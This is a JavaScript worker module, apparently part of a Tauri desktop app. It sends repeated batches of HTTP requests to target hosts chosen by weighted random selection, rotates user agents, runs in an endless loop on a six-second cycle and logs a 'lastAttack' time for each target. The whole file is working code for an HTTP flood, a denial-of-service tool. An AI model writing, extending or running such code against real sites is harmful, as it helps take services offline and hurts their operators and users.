import weightedRandom from 'weighted-random';
import state from '@/utils/state.js';
import { invoke } from '@tauri-apps/api/tauri'

let statusWorker = false;
const shootIntervalSeconds = 6;

const createFetchesArray = () => {
  const fetchArray = [];
  for (let i = 1; i <= shootIntervalSeconds * state.limitRequestsPerSecond; i++) {
    const randomUrlIdx = weightedRandom(state.weight);
    const { host, proto, _id } = state.tasks[randomUrlIdx];
    fetchArray.push(`${proto}://${host}`);
    state.log[_id] = {
      ...state.log[_id],
      count: state.log[_id].count + 1,
      lastAttack: new Date(),
    };
  }
  return fetchArray;
};

const worker = async () => {
  if (!state.tasks.length) {
    statusWorker = false;
    return false;
  }
  state.startWorker = +new Date();
  state.totalRequests = 0;

  // eslint-disable-next-line
  while (1) {
    const urls = createFetchesArray();
    let invokeTookMs;
    try {
      const beforeFetch = new Date();
      state.totalRequests += Math.round(urls.length / 2);
      await invoke('run_fetch', {
        data: JSON.stringify({
          ua: state.userAgents,
          urls,
        })
      });
      state.totalRequests += Math.round(urls.length / 2);
      invokeTookMs = new Date() - beforeFetch;
      console.log('invoke took', invokeTookMs);
    } catch (e) {
      console.log('Somewhere has been rejected, current requests =>', e, state.totalRequests);
    }
    const holdOnTime = Math.max(0, shootIntervalSeconds * 1000 - invokeTookMs);
    await new Promise((r) => setTimeout(r, holdOnTime ));
  }
};

const startWorker = () => {
  if (!statusWorker) {
    statusWorker = true;
    worker();
  }
};

export { startWorker };
export default worker;
